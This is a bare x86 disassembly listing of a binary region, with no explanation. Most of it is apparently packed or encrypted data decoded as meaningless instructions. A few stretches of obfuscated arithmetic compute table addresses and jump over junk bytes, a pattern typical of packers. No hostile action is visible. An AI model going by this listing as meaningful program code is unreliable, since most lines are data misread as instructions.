  41f412:	xlat   BYTE PTR ds:[ebx]
  41f413:	jge    0x41f48c
  41f415:	push   ebp
  41f416:	jb     0x41f44b
  41f418:	out    dx,al
  41f419:	imul   ebp,DWORD PTR [eax+0x6f663cfa],0x5a
  41f420:	outs   dx,DWORD PTR ds:[esi]
  41f421:	shl    ebx,cl
  41f423:	loope  0x41f3de
  41f425:	xor    al,0x9d
  41f427:	cmp    eax,0x28c8c97c
  41f42c:	js     0x41f41b
  41f42e:	xor    ecx,eax
  41f430:	imul   edx,DWORD PTR ss:[esi],0xcb748232
  41f437:	xlat   BYTE PTR ds:[ebx]
  41f438:	fnstenv [ecx-0x6d]
  41f43b:	push   0xfffffffc
  41f43d:	ins    BYTE PTR es:[edi],dx
  41f43e:	cdq    
  41f43f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f440:	mov    esp,ebp
  41f442:	add    dl,ch
  41f444:	mov    al,ds:0x55bee646
  41f449:	in     eax,0xe8
  41f44b:	cdq    
  41f44c:	mov    ds:0xa2c8a3e3,al
  41f451:	xchg   ebx,eax
  41f452:	(bad)  
  41f454:	cmp    cl,cl
  41f456:	adc    al,0x8c
  41f458:	test   eax,0x273bc91c
  41f45d:	mov    eax,DWORD PTR [ebx]
  41f45f:	pop    edx
  41f460:	cmc    
  41f461:	jo     0x41f447
  41f463:	ror    BYTE PTR [ecx+0x103f9f5c],cl
  41f469:	or     dh,ah
  41f46b:	or     eax,0x5cfa382c
  41f470:	leave  
  41f471:	mov    ecx,ebx
  41f473:	mov    ch,0x70
  41f475:	rcr    bl,0xd9
  41f478:	pop    es
  41f479:	(bad)  
  41f47a:	add    BYTE PTR [ebx-0x16],0x82
  41f47e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f47f:	sbb    esp,eax
  41f481:	cmp    eax,0x997e3fe5
  41f486:	ret    
  41f487:	pop    ecx
  41f488:	pop    es
  41f489:	and    esp,edi
  41f48b:	dec    eax
  41f48c:	test   DWORD PTR [ebp+0x92d4a02],ebx
  41f492:	pop    ss
  41f493:	cdq    
  41f494:	aad    0xbb
  41f496:	loopne 0x41f458
  41f498:	ficomp WORD PTR [eax-0x6]
  41f49b:	outs   dx,DWORD PTR ds:[esi]
  41f49c:	shl    DWORD PTR [ecx-0x5b03ef4b],0x4b
  41f4a3:	sub    BYTE PTR [edx+eiz*1],dh
  41f4a6:	ins    BYTE PTR es:[edi],dx
  41f4a7:	mov    ds:0xfcd669c3,eax
  41f4ac:	bound  esi,QWORD PTR [ecx+0x34]
  41f4af:	pop    ss
  41f4b0:	jge    0x41f45d
  41f4b2:	or     eax,0xe3358cd4
  41f4b7:	dec    eax
  41f4b9:	jecxz  0x41f4a3
  41f4bb:	test   dl,bh
  41f4bd:	shl    BYTE PTR [ebp*4+0x6b8cf0d3],cl
  41f4c4:	shr    BYTE PTR [ecx],1
  41f4c6:	lods   eax,DWORD PTR ds:[esi]
  41f4c7:	(bad)  
  41f4c9:	jg     0x41f533
  41f4cb:	and    BYTE PTR [edx-0x63a75508],dh
  41f4d1:	jp     0x41f519
  41f4d3:	push   ebp
  41f4d4:	sbb    DWORD PTR [edi],edx
  41f4d6:	je     0x41f4cd
  41f4d8:	jb     0x41f47c
  41f4da:	sub    bl,ch
  41f4dc:	and    eax,DWORD PTR [ecx+0x2e]
  41f4df:	shl    BYTE PTR [esi-0x6b],cl
  41f4e2:	inc    edi
  41f4e3:	push   eax
  41f4e4:	test   eax,0xb6178620
  41f4e9:	and    eax,0x8b65807b
  41f4ee:	dec    esi
  41f4ef:	jne    0x41f517
  41f4f1:	js     0x41f4ea
  41f4f3:	les    esp,FWORD PTR [eax+0x44531522]
  41f4f9:	pop    esp
  41f4fa:	test   BYTE PTR [esi-0x14],0xa0
  41f4fe:	and    DWORD PTR [edx-0x2ebd0c1e],ecx
  41f504:	rcr    DWORD PTR [edi-0x633ad740],1
  41f50a:	(bad)  
  41f50b:	fstp   QWORD PTR [esi+0x60]
  41f50e:	and    ebx,0x5e
  41f511:	inc    ebx
  41f512:	cli    
  41f513:	(bad)  
  41f514:	dec    edi
  41f515:	imul   ecx,edx,0xffffffde
  41f518:	xchg   ecx,eax
  41f519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f51a:	jmp    0x41f50d
  41f51c:	dec    ebx
  41f51d:	(bad)  
  41f51e:	imul   esp,DWORD PTR [edx+0x4c7ac582],0x6f69c516
  41f528:	hlt    
  41f529:	dec    ebx
  41f52a:	shl    esp,0x85
  41f52d:	jns    0x41f4d4
  41f52f:	ins    DWORD PTR es:[edi],dx
  41f530:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f531:	and    al,0x7a
  41f533:	loope  0x41f542
  41f535:	dec    esi
  41f536:	int3   
  41f537:	jl     0x41f4e5
  41f539:	adc    eax,0xa2e2e116
  41f53e:	cmp    al,0x27
  41f540:	sub    al,0xf6
  41f542:	fisttp QWORD PTR [ebx+0x57]
  41f545:	in     al,0x1f
  41f547:	call   0x5f6f:0x23956148
  41f54e:	adc    BYTE PTR [eax*8+0xa07aae4],bh
  41f555:	cmp    BYTE PTR [eax],bh
  41f557:	add    dl,ch
  41f559:	cmp    eax,0xb6690694
  41f55e:	xor    al,0x5c
  41f560:	out    dx,al
  41f561:	mov    edx,0x27c314c7
  41f566:	and    al,0x94
  41f568:	sub    al,0x86
  41f56a:	pop    ebp
  41f56b:	dec    ebx
  41f56c:	dec    esi
  41f56d:	jne    0x41f564
  41f56f:	sub    al,0xb5
  41f571:	sbb    ebp,ebx
  41f573:	cs jbe 0x41f5a8
  41f576:	and    edi,DWORD PTR [edx-0x7c9a3743]
  41f57c:	stos   BYTE PTR es:[edi],al
  41f57d:	push   esi
  41f57e:	fbld   TBYTE PTR [edx-0x738cac4f]
  41f584:	leave  
  41f585:	cmp    DWORD PTR [eax-0xf1925af],ebp
  41f58b:	jge    0x41f5bc
  41f58d:	and    eax,esp
  41f58f:	mov    bh,0x36
  41f591:	(bad)  
  41f592:	test   al,0xd
  41f594:	mov    ecx,DWORD PTR [ebp-0xdc]
  41f59a:	and    eax,ecx
  41f59c:	add    eax,DWORD PTR [ebp-0x44]
  41f59f:	mov    ecx,DWORD PTR [ebp-0xe0]
  41f5a5:	lea    eax,[eax+ecx*1+0x272f]
  41f5ac:	xor    eax,0x1080c
  41f5b1:	add    eax,DWORD PTR [ebp-0x178]
  41f5b7:	mov    DWORD PTR [ebp-0xe8],eax
  41f5bd:	mov    DWORD PTR [ebp-0xc],0x5950
  41f5c4:	mov    DWORD PTR [ebp-0xf8],0x4964
  41f5ce:	mov    DWORD PTR [ebp-0x130],0x3
  41f5d8:	mov    DWORD PTR [ebp-0x20],0x2df9
  41f5df:	mov    DWORD PTR [ebp-0x8],0x4524
  41f5e6:	mov    DWORD PTR [ebp-0xd4],0x637e
  41f5f0:	mov    DWORD PTR [ebp-0x110],0x38c8
  41f5fa:	mov    DWORD PTR [ebp-0xa4],0x7118
  41f604:	mov    DWORD PTR [ebp-0xa0],0xaf6
  41f60e:	mov    DWORD PTR [ebp-0x10c],0x3315
  41f618:	mov    eax,DWORD PTR [ebp-0xf8]
  41f61e:	mov    ecx,DWORD PTR [ebp-0x130]
  41f624:	xor    edx,edx
  41f626:	div    ecx
  41f628:	add    eax,0x454e
  41f62d:	mov    ecx,DWORD PTR [ebp-0xc]
  41f630:	and    eax,ecx
  41f632:	xor    eax,0x5940
  41f637:	add    eax,DWORD PTR [ebp+0x8]
  41f63a:	mov    ecx,DWORD PTR [ebp-0x110]
  41f640:	mov    edx,DWORD PTR [ebp-0xa4]
  41f646:	sub    ecx,edx
  41f648:	mov    edx,DWORD PTR [ebp-0xd4]
  41f64e:	or     ecx,edx
  41f650:	mov    edx,DWORD PTR [ebp-0x8]
  41f653:	and    ecx,edx
  41f655:	jmp    0x41fa3c
  41f65a:	cmp    DWORD PTR [ebx-0x6397a419],esi
  41f660:	mov    edx,0x50f9fab3
  41f665:	sahf   
  41f666:	in     eax,0x2e
  41f668:	and    al,0x9e
  41f66a:	dec    esp
  41f66b:	test   eax,eax
  41f66d:	mov    esi,0xbebec44a
  41f672:	mov    eax,0x808b4eb7
  41f677:	xchg   esp,eax
  41f678:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f679:	in     eax,0x3a
  41f67b:	or     ebx,esp
  41f67d:	sub    DWORD PTR [edx],esi
  41f67f:	ss pop edi
  41f681:	pop    es
  41f682:	sbb    al,0x98
  41f684:	inc    ecx
  41f685:	loop   0x41f6a2
  41f687:	mov    al,0x94
  41f689:	mov    dh,0xde
  41f68b:	jle    0x41f6c5
  41f68d:	shr    BYTE PTR ds:0x898d045e,cl
  41f693:	stos   BYTE PTR es:[edi],al
  41f694:	aam    0x39
  41f696:	enter  0xb06,0xea
  41f69a:	sbb    edx,DWORD PTR [ebx-0x1a]
  41f69d:	sub    DWORD PTR [eax+ecx*8],edx
  41f6a0:	sub    al,0x47
  41f6a2:	dec    ecx
  41f6a3:	xor    ch,BYTE PTR [esi]
  41f6a5:	inc    ebp
  41f6a6:	clc    
  41f6a7:	mov    ebx,0x5e7fdfb0
  41f6ac:	ss dec ecx
  41f6ae:	ja     0x41f6af
  41f6b0:	out    0xfe,eax
  41f6b2:	rcl    ch,0x10
  41f6b5:	lods   al,BYTE PTR ds:[esi]
  41f6b6:	adc    BYTE PTR [ecx-0x4b],0x89
  41f6ba:	xlat   BYTE PTR ds:[ebx]
  41f6bb:	aam    0x77
  41f6bd:	arpl   WORD PTR [ebx+0x59ebe722],si
  41f6c3:	scas   al,BYTE PTR es:[edi]
  41f6c4:	inc    ebp
  41f6c5:	aas    
  41f6c6:	psrld  xmm2,XMMWORD PTR [edi-0x12]
  41f6cb:	(bad)  
  41f6cf:	bound  esi,QWORD PTR cs:0x7e3243f4
  41f6d6:	jb     0x41f6ff
  41f6d8:	dec    ebp
  41f6d9:	jb     0x41f6e4
  41f6db:	pushf  
  41f6dc:	lds    edi,FWORD PTR [esi+ebx*8]
  41f6df:	adc    al,0x1e
  41f6e1:	jnp    0x41f680
  41f6e3:	(bad)  
  41f6e4:	and    ah,ch
  41f6e6:	sub    DWORD PTR [esi+eax*4],ebx
  41f6e9:	xor    edx,esp
  41f6eb:	jg     0x41f761
  41f6ed:	shr    BYTE PTR [eax+0x78],cl
  41f6f0:	sbb    al,0x65
  41f6f2:	jecxz  0x41f6a7
  41f6f4:	out    0xb6,eax
  41f6f6:	push   cs
  41f6f7:	cwde   
  41f6f8:	or     ebx,DWORD PTR [ebx+0x65]
  41f6fb:	xchg   esp,eax
  41f6fc:	fwait
  41f6fd:	adc    edx,esi
  41f6ff:	arpl   cx,sp
  41f701:	jp     0x41f68c
  41f703:	dec    eax
  41f704:	call   0x27923c5c
  41f709:	in     eax,0x52
  41f70b:	xchg   BYTE PTR [ebx+0x3],al
  41f70e:	xlat   BYTE PTR ds:[ebx]
  41f70f:	xor    cl,BYTE PTR [ecx+0x43383d20]
  41f715:	(bad)  
  41f716:	jb     0x41f6a0
  41f718:	inc    eax
  41f719:	test   eax,0x652a654c
  41f71e:	mov    ss,esi
  41f720:	mov    bl,0xc4
  41f722:	jns    0x41f6b0
  41f724:	sub    eax,0xac43bdbe
  41f729:	enter  0x25a7,0x94
  41f72d:	clc    
  41f72e:	pop    ebx
  41f72f:	jb     0x41f6c1
  41f731:	data16 out 0x27,al
  41f734:	push   eax
  41f735:	push   esi
  41f736:	xchg   edx,eax
  41f737:	xor    DWORD PTR [edx+0x39848851],edi
  41f73d:	mov    ecx,0x46cdc322
  41f742:	das    
  41f743:	adc    eax,0x2e4df86b
  41f748:	arpl   WORD PTR [ecx+esi*1-0x27],bx
  41f74c:	test   DWORD PTR [eax-0x47],edi
  41f74f:	popa   
  41f750:	es out 0x4,eax
  41f753:	add    al,0x40
  41f755:	jecxz  0x41f745
  41f757:	push   es
  41f758:	push   0xefa38dcf
  41f75d:	ja     0x41f6fd
  41f75f:	mov    eax,ds:0x45d855ed
  41f764:	jg     0x41f79f
  41f766:	dec    ebp
  41f767:	xchg   ebp,eax
  41f768:	inc    edi
  41f769:	pop    ebp
  41f76a:	fdiv   st(1),st
  41f76c:	ret    0x14dc
  41f76f:	ret    
  41f770:	fistp  DWORD PTR [ecx]
  41f772:	in     eax,0x5d
  41f774:	adc    ah,bl
  41f776:	cmovp  edx,DWORD PTR [ecx+edx*4]
  41f77a:	add    BYTE PTR [ecx],bh
  41f77c:	mov    eax,0x192f9512
  41f781:	jo     0x41f7b0
  41f783:	aad    0x7e
  41f785:	xchg   ecx,eax
  41f786:	(bad)  
  41f787:	mov    bh,0xcd
  41f789:	dec    ecx
  41f78a:	xchg   ebx,eax
  41f78b:	pop    esp
  41f78c:	and    eax,0xf817f93
  41f791:	mov    al,ds:0xdf0943a8
  41f796:	mov    ebx,0xa900916f
  41f79b:	std    
  41f79c:	fst    st(5)
  41f79e:	lock sbb BYTE PTR [ebp+eax*4-0x40563316],ch
  41f7a6:	ror    BYTE PTR [ebp+0x34],0xc4
  41f7aa:	imul   eax,DWORD PTR [edx+0x63],0x26228e01
  41f7b1:	mov    edi,0x4cb70f3a
  41f7b6:	jp     0x41f796
  41f7b8:	pop    edi
  41f7b9:	out    dx,al
  41f7ba:	sbb    ebp,DWORD PTR [ebx+0x10]
  41f7bd:	sbb    al,BYTE PTR [edx]
  41f7bf:	mov    cl,0x86
  41f7c1:	pushf  
  41f7c2:	xlat   BYTE PTR ds:[ebx]
  41f7c3:	out    dx,al
  41f7c4:	stos   BYTE PTR es:[edi],al
  41f7c5:	lods   al,BYTE PTR ds:[esi]
  41f7c6:	ins    DWORD PTR es:[edi],dx
  41f7c7:	xor    cl,BYTE PTR [edx+edx*4+0xc]
  41f7cb:	pusha  
  41f7cc:	jno    0x41f839
  41f7ce:	add    cl,BYTE PTR cs:[ecx]
  41f7d1:	jo     0x41f81e
  41f7d3:	sub    al,bl
  41f7d5:	pusha  
  41f7d6:	ins    BYTE PTR es:[edi],dx
  41f7d7:	mov    ebx,0xe668dfca
  41f7dc:	add    BYTE PTR [ecx+0x53],al
  41f7df:	cs pop esp
  41f7e1:	cli    
  41f7e2:	adc    BYTE PTR [edx],bh
  41f7e4:	pop    eax
  41f7e5:	push   edx
  41f7e6:	and    dh,BYTE PTR [eax-0x7407bfe7]
  41f7ec:	(bad)  
  41f7ed:	mov    WORD PTR [edx+0x5f],ss
  41f7f0:	inc    ebx
  41f7f1:	shr    BYTE PTR [ecx-0x4d4bd506],1
  41f7f7:	fwait
  41f7f8:	xor    BYTE PTR [ecx+ebx*4+0x5a1fa5a3],ah
  41f7ff:	out    0x55,al
  41f801:	sti    
  41f802:	sbb    DWORD PTR [eax-0x2962472b],edx
  41f808:	jnp    0x41f7a4
  41f80a:	cmp    BYTE PTR [edi],al
  41f80c:	adc    DWORD PTR [edx],ebx
  41f80e:	fidiv  WORD PTR [ecx]
  41f810:	push   edi
  41f811:	cwde   
  41f812:	dec    ecx
  41f813:	imul   esi,DWORD PTR [di-0x54],0x1783dbd4
  41f81b:	xchg   esp,eax
  41f81c:	pushf  
  41f81d:	jo     0x41f863
  41f81f:	shr    BYTE PTR [ecx+0x707905cd],0x14
  41f826:	bound  edi,QWORD PTR [ebp+0x47]
  41f829:	and    al,BYTE PTR [ebp-0xe]
  41f82c:	dec    eax
  41f82d:	stos   BYTE PTR es:[edi],al
  41f82e:	push   ds
  41f82f:	xchg   edi,eax
  41f830:	mov    dl,0x41
  41f832:	ss mov ebp,0xa441ab90
  41f838:	outs   dx,BYTE PTR ds:[esi]
  41f839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f83a:	aaa    
  41f83b:	bound  ebp,QWORD PTR [ebx-0x5dacec40]
  41f841:	cmp    DWORD PTR [esp-0x43bb6a4],eax
  41f848:	jo     0x41f824
  41f84a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f84b:	scas   al,BYTE PTR es:[edi]
  41f84c:	js     0x41f899
  41f84e:	test   eax,0xdc128560
  41f853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f854:	push   edi
  41f855:	aam    0xf8
  41f857:	sub    DWORD PTR [esi-0x3d081345],ebp
  41f85d:	mov    ah,0xaf
  41f85f:	xor    BYTE PTR [ebx+0xed5839e],bl
  41f865:	xor    eax,0xfd87034b
  41f86a:	js     0x41f851
  41f86c:	fs mov esi,0xa99e99f1
  41f872:	scas   eax,DWORD PTR es:[edi]
  41f873:	shl    DWORD PTR [edx],0xe7
  41f876:	mov    ds:0x4cf7fec9,eax
  41f87b:	test   al,0xaf
  41f87d:	cld    
  41f87e:	outs   dx,DWORD PTR ds:[esi]
  41f87f:	loopne 0x41f8a5
  41f881:	je     0x41f87f
  41f883:	icebp  
  41f884:	mov    ah,0x89
  41f886:	fisttp QWORD PTR [ecx]
  41f888:	and    dh,BYTE PTR [ebp-0x56]
  41f88b:	or     cl,BYTE PTR [edi+esi*8]
  41f88e:	push   ds
  41f88f:	xor    DWORD PTR [esi-0x4a369f1a],eax
  41f895:	push   ds
  41f896:	inc    ecx
  41f897:	cmp    ch,BYTE PTR es:[edx+0x44]
  41f89b:	rcl    BYTE PTR [eax-0x1b],0x49
  41f89f:	jae    0x41f86d
  41f8a1:	xchg   BYTE PTR [esi+0xc],dl
  41f8a4:	loopne 0x41f8a0
  41f8a6:	push   es
  41f8a7:	pop    ds
  41f8a8:	inc    eax
  41f8a9:	push   ss
  41f8aa:	mov    ds:0x18dcce83,al
  41f8af:	pop    ds
  41f8b0:	xchg   DWORD PTR [ebp+0xdaa36a7],ecx
  41f8b6:	pop    esp
  41f8b7:	imul   ecx,DWORD PTR [ebx+esi*4-0xc5444c6],0x60
  41f8bf:	push   ecx
  41f8c0:	jbe    0x41f8b1
  41f8c2:	fcom   QWORD PTR ds:0x7b5ca0c9
  41f8c8:	xor    eax,0xf93cdbdd
  41f8cd:	jo     0x41f8c4
  41f8cf:	shl    BYTE PTR [ecx+0x51],1
  41f8d2:	dec    ecx
  41f8d3:	cwde   
  41f8d4:	inc    ebx
  41f8d5:	stc    
  41f8d6:	and    al,0xfb
  41f8d9:	cmp    ah,al
  41f8db:	int    0x6
  41f8dd:	push   esp
  41f8de:	dec    esp
  41f8df:	jmp    0x41f924
  41f8e1:	and    BYTE PTR [edi],ah
  41f8e3:	repz or al,0xb
  41f8e6:	mov    dl,0x82
  41f8e8:	inc    ebx
  41f8e9:	add    DWORD PTR [ebp-0x40],edi
  41f8ec:	xor    DWORD PTR [edx-0x8e855f1],0xffffffc6
  41f8f3:	add    eax,0x3671cf08
  41f8f8:	(bad)  
  41f8f9:	imul   esp,DWORD PTR [edx-0x6e],0x18
  41f8fd:	cli    
  41f8fe:	outs   dx,BYTE PTR ds:[esi]
  41f8ff:	fucom  st(2)
  41f901:	xor    DWORD PTR [esi],edi
  41f903:	addr16 cld 
  41f905:	pop    ebp
  41f906:	jle    0x41f8fe
  41f908:	test   BYTE PTR [esi+0x5e],al
  41f90b:	jae    0x41f8ed
  41f90d:	cmp    al,BYTE PTR [edx-0x21]
  41f910:	fxch   st(0)
  41f912:	pop    ss
  41f913:	iret   
  41f914:	fisttp DWORD PTR [eax]
  41f916:	xchg   esi,eax
  41f917:	and    DWORD PTR [esi-0x7d],edx
  41f91a:	push   0xf
  41f91c:	xlat   BYTE PTR ds:[ebx]
  41f91d:	rcl    BYTE PTR [eax-0x45],cl
  41f920:	sbb    edi,esp
  41f922:	or     al,0xb5
  41f924:	mov    cl,0x9d
  41f926:	push   ebx
  41f927:	xchg   edx,eax
  41f928:	imul   ebx,esp,0xffffff9c
  41f92b:	(bad)  
  41f92e:	mov    al,0xc3
  41f930:	sub    DWORD PTR [edx],ebp
  41f932:	add    cl,dl
  41f934:	push   ss
  41f935:	push   ss
  41f936:	push   edx
  41f937:	data16 and bh,BYTE PTR ds:0x8038891e
  41f93e:	dec    edi
  41f93f:	inc    ecx
  41f940:	pop    edi
  41f941:	les    esi,FWORD PTR [esi+0x27ae3c5f]
  41f947:	push   DWORD PTR [esi-0x59]
  41f94a:	inc    ecx
  41f94b:	hlt    
  41f94c:	add    esp,DWORD PTR [edx-0x6e]
  41f94f:	sub    al,0xa6
  41f951:	dec    ecx
  41f952:	mov    bh,0x8a
  41f954:	adc    BYTE PTR [ebx+0x3],bh
  41f957:	sub    dh,al
  41f959:	adc    eax,0xa4907c19
  41f95e:	jp     0x41f9cb
  41f960:	inc    eax
  41f961:	sbb    eax,DWORD PTR [edx]
  41f963:	stos   DWORD PTR es:[edi],eax
  41f964:	xchg   edx,eax
  41f966:	cmp    al,ah
  41f968:	mov    ch,0x4c
  41f96a:	out    dx,al
  41f96b:	enter  0x7e88,0x7b
  41f96f:	test   BYTE PTR [ebx],0xe
  41f972:	lods   eax,DWORD PTR ds:[esi]
  41f973:	pusha  
  41f974:	cdq    
  41f975:	push   esp
  41f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f977:	adc    bl,BYTE PTR [ebp+0x71]
  41f97a:	mov    eax,0x4b6d969e
  41f97f:	fcmovnbe st,st(1)
  41f981:	push   edi
  41f982:	inc    esp
  41f983:	jmp    0xa1ce:0xae54e386
  41f98a:	inc    ebx
  41f98b:	fs inc esp
  41f98d:	push   edi
  41f98e:	inc    bp
  41f990:	inc    ebp
  41f991:	dec    ecx
  41f992:	enter  0x43e2,0xe8
  41f996:	retf   
  41f997:	imul   BYTE PTR [ebx+0xf]
  41f99a:	mov    dh,0xe7
  41f99c:	sbb    BYTE PTR [esi+0x48238bdb],dl
  41f9a2:	out    dx,eax
  41f9a3:	jmp    0x41f952
  41f9a5:	jne    0x41f93e
  41f9a7:	push   ss
  41f9a8:	xchg   ecx,eax
  41f9a9:	pop    ss
  41f9aa:	jnp    0x41f93a
  41f9ac:	mov    DWORD PTR [edi],edi
  41f9ae:	icebp  
  41f9af:	jae    0x41f9c7
  41f9b1:	out    dx,al
  41f9b2:	cli    
  41f9b3:	loopne 0x41f95d
  41f9b5:	scas   eax,DWORD PTR es:[edi]
  41f9b6:	scas   eax,DWORD PTR es:[edi]
  41f9b7:	xchg   DWORD PTR [ecx-0x5c],eax
  41f9ba:	(bad)  
  41f9bb:	pop    gs
  41f9bd:	pop    es
  41f9be:	or     bh,BYTE PTR [ecx]
  41f9c0:	cmp    eax,0x9703dafb
  41f9c5:	xchg   ebx,eax
  41f9c6:	test   BYTE PTR [ebp+edx*8+0x73],0x78
  41f9cb:	popa   
  41f9cc:	jmp    0xe69:0xa678b837
  41f9d3:	cs adc eax,0x1cf80ffa
  41f9d9:	mov    ch,0x31
  41f9db:	je     0x41f981
  41f9dd:	mov    cl,BYTE PTR [esi]
  41f9df:	fdivr  st,st(0)
  41f9e1:	scas   al,BYTE PTR es:[edi]
  41f9e2:	(bad)  
  41f9e3:	fcom   DWORD PTR fs:[ecx]
  41f9e6:	call   0x38c6:0x71e9012d
  41f9ed:	jb     0x41f9d2
  41f9ef:	cdq    
  41f9f0:	sbb    ch,BYTE PTR [eax+0x72d52cb2]
  41f9f6:	lods   al,BYTE PTR ds:[esi]
  41f9f7:	xchg   edi,eax
  41f9f8:	pop    ss
  41f9f9:	jb     0x41fa3f
  41f9fb:	cmp    BYTE PTR [esi+0x4f8c6582],ch
  41fa01:	int3   
  41fa02:	pop    es
  41fa03:	inc    esi
  41fa04:	dec    ebx
  41fa05:	cmp    eax,0x332cbaa2
  41fa0a:	pop    esp
  41fa0b:	int    0xd6
  41fa0d:	in     eax,dx
  41fa0e:	clc    
  41fa0f:	inc    esi
  41fa10:	dec    edx
  41fa11:	xchg   esi,eax
  41fa12:	add    eax,0x4b871985
  41fa17:	sbb    DWORD PTR [eax],ecx
  41fa19:	sbb    eax,0x9871cdff
  41fa1e:	add    al,0x95
  41fa20:	jecxz  0x41f9e0
  41fa22:	push   cs
  41fa23:	mov    ch,0x6c
  41fa25:	int3   
  41fa26:	adc    edi,DWORD PTR [edx]
  41fa28:	repz xlat BYTE PTR gs:[ebx]
  41fa2b:	repnz sbb bh,BYTE PTR [eax+0x1c]
  41fa2f:	inc    edi
  41fa30:	mov    WORD PTR [eax+ecx*1],?
  41fa33:	cli    
  41fa34:	jp     0x41faae
  41fa36:	mov    ebx,0xa7cce413
  41fa3b:	push   eax
  41fa3c:	mov    edx,DWORD PTR [ebp-0x20]
  41fa3f:	xor    ecx,edx
  41fa41:	mov    edx,DWORD PTR [ebp-0x10c]
  41fa47:	mov    esi,0x180f
  41fa4c:	sub    esi,edx
  41fa4e:	mov    edx,DWORD PTR [ebp-0xa0]
  41fa54:	imul   esi,edx
  41fa57:	xor    esi,0x402b
  41fa5d:	xor    esi,0xfed78c17
  41fa63:	mov    edx,DWORD PTR [ebp-0xe8]
  41fa69:	mov    ecx,DWORD PTR [edx+ecx*1-0x68bd]
  41fa70:	add    ecx,eax
  41fa72:	add    esi,ecx
  41fa74:	mov    DWORD PTR [ebp-0x38],esi
  41fa77:	mov    DWORD PTR [ebp-0x4],0x59a8
  41fa7e:	mov    DWORD PTR [ebp-0x30],0x7021
  41fa85:	mov    DWORD PTR [ebp-0xf4],0x6210
  41fa8f:	mov    DWORD PTR [ebp-0x58],0x73d5
  41fa96:	mov    DWORD PTR [ebp-0x124],0x1e7d
  41faa0:	mov    DWORD PTR [ebp-0x3c],0x3144
  41faa7:	mov    eax,DWORD PTR [ebp-0x30]
  41faaa:	xor    eax,0x75cb
  41faaf:	mov    ecx,DWORD PTR [ebp-0x4]
  41fab2:	imul   eax,ecx
  41fab5:	mov    ecx,DWORD PTR [ebp+0x8]
  41fab8:	lea    ecx,[ecx+eax*1-0x2123b90]
  41fabf:	mov    eax,DWORD PTR [ebp-0xf4]
  41fac5:	and    eax,0x6b34
  41faca:	and    eax,0x658d
  41facf:	xor    edx,edx
  41fad1:	push   0x6
  41fad3:	pop    esi
  41fad4:	div    esi
  41fad6:	imul   eax,eax,0x3fb9
  41fadc:	mov    edx,DWORD PTR [ebp-0x3c]
  41fadf:	and    edx,0x58c7
  41fae5:	mov    esi,DWORD PTR [ebp-0x124]
  41faeb:	or     edx,esi
  41faed:	add    edx,0x7a25
  41faf3:	imul   edx,edx,0x28d2
  41faf9:	mov    esi,DWORD PTR [ebp-0x58]
  41fafc:	xor    edx,esi
  41fafe:	xor    edx,0x1856f731
  41fb04:	mov    esi,DWORD PTR [ebp-0xe8]
  41fb0a:	mov    eax,DWORD PTR [esi+eax*1-0x3fb8fdc]
  41fb11:	add    eax,ecx
  41fb13:	add    edx,eax
  41fb15:	mov    DWORD PTR [ebp-0xac],edx
  41fb1b:	mov    DWORD PTR [ebp-0x54],0x1
  41fb22:	mov    DWORD PTR [ebp-0x40],0x1ee8
  41fb29:	mov    DWORD PTR [ebp-0x1c],0x64d8
  41fb30:	mov    DWORD PTR [ebp-0xf0],0x5a06
  41fb3a:	mov    DWORD PTR [ebp-0x108],0x2eeb
  41fb44:	mov    DWORD PTR [ebp-0x104],0x2108
  41fb4e:	mov    eax,DWORD PTR [ebp-0x1c]
  41fb51:	jmp    0x41ff38
  41fb56:	cwde   
  41fb57:	push   ebx
  41fb58:	popa   
  41fb59:	pop    edx
  41fb5a:	stos   BYTE PTR es:[edi],al
  41fb5b:	jl     0x41fb15
  41fb5d:	xchg   ebx,eax
  41fb5e:	mov    dl,0x3a
  41fb60:	repnz iret 
  41fb62:	dec    ebx
  41fb63:	test   eax,0x8dd7908e
  41fb68:	sar    BYTE PTR [esi-0x41413bb6],0x20
  41fb6f:	dec    ecx
  41fb70:	or     al,0xc2
  41fb72:	out    0x5c,eax
  41fb74:	or     BYTE PTR [ecx-0x5b],ah
  41fb77:	or     eax,0xc6f9af91
  41fb7c:	pop    ss
  41fb7d:	in     eax,0x45
  41fb7f:	xor    al,0xa9
  41fb81:	xor    ebp,DWORD PTR [ebx-0xa]
  41fb84:	mov    esi,0xd217a4f4
  41fb89:	or     eax,0xe398100a
  41fb8e:	mov    al,0x68
  41fb90:	mov    BYTE PTR [edx-0x4a009f30],al
  41fb96:	ins    BYTE PTR es:[edi],dx
  41fb97:	push   esi
  41fb98:	test   DWORD PTR [esi],edx
  41fb9a:	mov    esi,0x39765bec
  41fb9f:	imul   DWORD PTR [edi+edx*4+0x72f7dc9f]
  41fba6:	sti    
  41fba7:	mov    ebp,0xdbfd3889
  41fbac:	stc    
  41fbad:	loopne 0x41fb4d
  41fbaf:	(bad)  
  41fbb1:	push   ss
  41fbb2:	out    0xe4,al
  41fbb4:	sahf   
  41fbb5:	or     eax,DWORD PTR [eax-0x45]
  41fbb8:	add    bh,bl
  41fbba:	inc    eax
  41fbbb:	rcl    DWORD PTR [ecx],0x51
  41fbbe:	ror    DWORD PTR [edi-0x5b],cl
  41fbc1:	add    BYTE PTR [eax+0x6e2fd67],bh
  41fbc7:	or     DWORD PTR [ebp-0x57],0x1c
  41fbcb:	mov    ch,0x83
  41fbcd:	xchg   ebp,eax
  41fbce:	jo     0x41fbe5
  41fbd0:	mov    ebp,0x3469229e
  41fbd5:	(bad)  
  41fbd6:	ds mov al,0xe0
  41fbd9:	or     BYTE PTR ds:0x8c9a6560,ch
  41fbdf:	mov    dh,0x29
  41fbe1:	icebp  
  41fbe2:	ja     0x41fc02
  41fbe4:	jecxz  0x41fc21
  41fbe6:	jge    0x41fc3e
  41fbe8:	enter  0x3af9,0x90
  41fbec:	ss push edi
  41fbee:	push   0xfffffff4
  41fbf0:	jo     0x41fb9d
  41fbf2:	sbb    DWORD PTR [edx-0x35],ecx
  41fbf5:	in     al,0xfe
  41fbf7:	jmp    DWORD PTR [edx+0x16b782f7]
  41fbfd:	test   BYTE PTR [ebx+0x0],al
